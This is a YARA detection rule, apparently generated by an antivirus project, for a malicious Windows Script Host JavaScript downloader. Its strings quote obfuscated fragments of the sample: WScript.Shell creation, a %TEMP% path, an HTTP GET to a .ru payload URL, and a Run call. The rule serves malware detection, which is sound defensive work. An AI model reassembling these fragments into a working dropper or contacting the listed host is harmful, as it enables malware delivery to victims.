rule sig_20160427_09e4c67666eb6c2f8d8c05eb6fc7a37f {
  meta:
    description = "datamaliciousorder - file 20160427_09e4c67666eb6c2f8d8c05eb6fc7a37f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2f8d0ea803c03b3c3426dab8f66d0640feaee2bc34a264fabd5aa041b984b4a1"

  strings:
    $s1  = "function NavnfWshav() {return FxtkoEvxbb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"MvzfdG2" ascii
    $s2  = "function NavnfWshav() {return FxtkoEvxbb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"MvzfdG2" ascii
    $s3  = "function FedwuGtxoz(RkxjnCjuer, GfmhnHhxtu){MkhssAiztu = MkhssAiztu * 1; return RkxjnCjuer - GfmhnHhxtu;};" fullword ascii
    $s4  = "var FxtkoEvxbb = function LzicfUfapo() {return CxcywMufvk[BomtiLvwcl](\"WScript\"+\".Shell\");}(), LyhyeHrvzu = 11;" fullword ascii
    $s5  = "CjtxdUjgxo[SshijQuhbo](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var CxcywMufvk = this[\"WScript\"];" fullword ascii
    $s7  = "if (CjtxdUjgxo[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function AfxvgEzvwk(QkwugCmwtl) {var GvvtbLsvtb = (1, 2, 3, 4, 5, QkwugCmwtl); return GvvtbLsvtb;};" fullword ascii
    $s9  = "LgymrFqupm = true; " fullword ascii
    $s10 = "function AopqrOpccd(TockfWfydr){FxtkoEvxbb[\"R\"+\"un\"](TockfWfydr, MkhssAiztu, MkhssAiztu);};" fullword ascii
    $s11 = "var RiddaFrqpt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "function VlxqyZjvbj(){return 23;};" fullword ascii
    $s13 = "}while (BcvcrSsanl);" fullword ascii
    $s14 = "return FedwuGtxoz(EjqpvFmdmk, GjohfVooeh);" fullword ascii
    $s15 = "function NzrmsKpfld(){return BomtiLvwcl;};" fullword ascii
    $s16 = "var DxznlBjeae = false;" fullword ascii
    $s17 = "function FfjvcAbtol(){return YgprfBzlxv + \"\";};" fullword ascii
    $s18 = "DxznlBjeae = true;" fullword ascii
    $s19 = "function SxquiElusp()" fullword ascii
    $s20 = "var LgymrFqupm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}